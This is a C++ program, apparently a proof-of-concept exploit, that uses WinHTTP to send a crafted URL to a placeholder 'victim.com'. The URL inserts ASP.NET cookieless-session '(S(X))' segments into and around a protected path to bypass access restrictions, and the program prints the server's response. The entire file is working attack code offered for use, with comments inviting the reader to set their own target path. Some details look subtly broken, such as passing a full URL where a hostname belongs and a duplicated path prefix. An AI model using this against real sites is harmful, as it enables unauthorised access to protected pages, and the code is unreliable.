#include <iostream>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

int main() {
    // Craft the malicious URL
    std::wstring targetDomain = L"https://victim.com";
    std::wstring cookielessPath = L"(S(X))";
    std::wstring vulnerablePath = L"/webform/protected/target1.aspx"; // Change to your target path

    std::wstring maliciousUrl = targetDomain + L"/webform/" + cookielessPath + L"/prot/" + cookielessPath + L"ected" + vulnerablePath;

    // Initialize WinHTTP
    HINTERNET hSession = WinHttpOpen(L"CookielessExploit", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        std::wcerr << L"WinHttpOpen failed!" << std::endl;
        return 1;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, targetDomain.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        std::wcerr << L"WinHttpConnect failed!" << std::endl;
        WinHttpCloseHandle(hSession);
        return 1;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", maliciousUrl.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        std::wcerr << L"WinHttpOpenRequest failed!" << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    // Send the request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        std::wcerr << L"WinHttpSendRequest failed!" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        std::wcerr << L"WinHttpReceiveResponse failed!" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    // Read the response
    DWORD bytesRead = 0;
    BYTE buffer[1024];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
        if (bytesRead > 0) {
            std::wcout.write(reinterpret_cast<const wchar_t*>(buffer), bytesRead / sizeof(wchar_t));
        } else {
            break;
        }
    }

    // Clean up
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}
